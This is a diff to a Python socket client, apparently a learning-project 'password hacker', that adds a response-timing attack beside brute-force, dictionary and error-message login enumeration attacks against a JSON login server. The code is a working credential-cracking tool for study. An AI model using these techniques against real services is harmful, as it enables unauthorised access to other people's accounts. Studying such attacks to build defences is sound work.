@@ -3,6 +3,7 @@ import socket
 import itertools
 import os
 import json
+import time
 
 ALPHA_DIG = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789"
 
@@ -15,6 +16,8 @@ def orginize_file_data(file):
     return datas
 
 def checker(data, client_socket, bufor=1024):
+
+    # login check
     if type(data) is dict and data["password"] == " ":
         p = json.dumps(data)
         bp = p.encode()
@@ -25,6 +28,7 @@ def checker(data, client_socket, bufor=1024):
         if response["result"] == "Wrong password!":
             return data
 
+    # password check exploit vulnerability
     if type(data) is dict and data["password"] != " ":
         p = json.dumps(data)
         bp = p.encode()
@@ -37,6 +41,23 @@ def checker(data, client_socket, bufor=1024):
         if response["result"] == "Connection success!":
             return response["result"]
 
+    # password check timed attack
+    if type(data) is dict and data["password"] != " ":
+        p = json.dumps(data)
+        bp = p.encode()
+        client_socket.send(bp)
+
+        time_start = time.perf_counter()
+        response = client_socket.recv(bufor)
+        time_stop = time.perf_counter()
+        recv_time = time_stop - time_start
+
+        response = response.decode()
+        response = json.loads(response)
+        if recv_time >= 0.1:
+            return response["result"]
+
+    # password check brute force
     for p in data:
         bp = p.encode()
         client_socket.send(bp)
@@ -77,10 +98,7 @@ def dict_brute_force(client_socket):
      if check:
          return check
 
-def exploit_login_possibl():
-    pass
-
-def exploit_vonul(client_socket):
+def exploit_vonul_and_time_attack(client_socket):
     logins = orginize_file_data("login.txt")
     for login in logins:
         passwrd = " "
@@ -116,9 +134,13 @@ def connect(client_socket):
 def main():
     with socket.socket() as client_socket:
         connect(client_socket)
-        print(brute_force(client_socket))
-        print(dict_brute_force(client_socket))
-        print(exploit_vonul(client_socket))
+
+        # Choose a hacking method:
+        # print(brute_force(client_socket))
+
+        # print(dict_brute_force(client_socket))
+
+        # print(exploit_vonul_and_time_attack(client_socket))
 
 if __name__ == "__main__":
     main()
